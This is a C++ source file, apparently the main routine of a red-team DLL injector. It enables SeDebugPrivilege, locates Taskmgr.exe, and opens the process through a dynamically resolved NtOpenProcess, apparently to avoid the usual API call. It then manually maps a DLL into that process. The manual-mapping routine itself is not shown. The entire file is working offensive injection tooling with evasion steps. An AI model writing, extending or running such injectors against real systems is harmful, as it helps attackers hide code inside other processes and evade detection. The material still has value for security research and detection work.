#include "injection.h"


const char szDll[] = "F:\\Codes\\c++ ired team\\Manual Mapping\\MYDLL.dll";

//const char szPoc[] = "C:\\Windows\\System32\\Taskmgr.exe";

const char szPoc[] = "Taskmgr.exe";

//const char szPoc[] = "notepad.exe";


int main() {


	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		TOKEN_PRIVILEGES tp = {};
		LUID luid = {};

		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
			tp.PrivilegeCount = 1;
			tp.Privileges[0].Luid = luid;
			tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
				printf("Warning: Failed to enable SeDebugPrivilege: 0x%X\n", GetLastError());
				printf("You may need to run as Administrator!\n");
				return false;
			}
			else {
				printf("SeDebugPrivilege enabled successfully\n");
			}
		}
		CloseHandle(hToken);
	}


	OBJECT_ATTRIBUTES ObjectAttr;
	InitializeObjectAttributes(&ObjectAttr, NULL, 0, NULL, NULL);
	CLIENT_ID clientID = { 0 };
	PROCESSENTRY32 PE32{ 0 };
	PE32.dwSize = sizeof(PE32);

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnap == INVALID_HANDLE_VALUE) {

		printf("CreateToolhlep32Snaphot Failed with Error 0x%X", GetLastError());

		return 0;
	}


	DWORD PID = 0;
	BOOL bRet = Process32First(hSnap, &PE32);

	while (bRet) {

		if (!_stricmp(szPoc, PE32.szExeFile)) {
			PID = PE32.th32ProcessID;
			clientID.UniqueProcess = ULongToHandle((ULONG)(PE32.th32ProcessID));
			break;
		}
		bRet = Process32Next(hSnap, &PE32);
	}

	CloseHandle(hSnap);


	//get a handle to the target process

	if (PID == 0) {
		printf("Process %s not found. PID is still 0.\n", szPoc);
		return 0;
	}

	HMODULE hModule = GetModuleHandle("ntdll.dll");

	PNtOpenProcess NtOpenProcess = (PNtOpenProcess)GetProcAddress(hModule, "NtOpenProcess");

	if (!NtOpenProcess) { printf("failed to open process with error %d \n", GetLastError()); return false; }


	//HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	HANDLE hProc = NULL;
	NTSTATUS openStatus = NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &ObjectAttr, &clientID);
	//NTSTATUS openStatus = NtOpenProcess(&hProc, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, &ObjectAttr, &clientID);
	
	//HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, PID);
	
	if (!NT_SUCCESS(openStatus)) { printf("failed to open process Error: %d\n\n", GetLastError()); }
	
	if (!hProc) {

		printf("OpenProcess Failed with Error 0x%X", GetLastError());
		return 0;

	}

	if (!ManualMap(hProc, szDll)) {

		printf("ManualMap function Failed with Error 0x%X", GetLastError());
		if (hProc) { CloseHandle(hProc); }
	}

	return 0;
}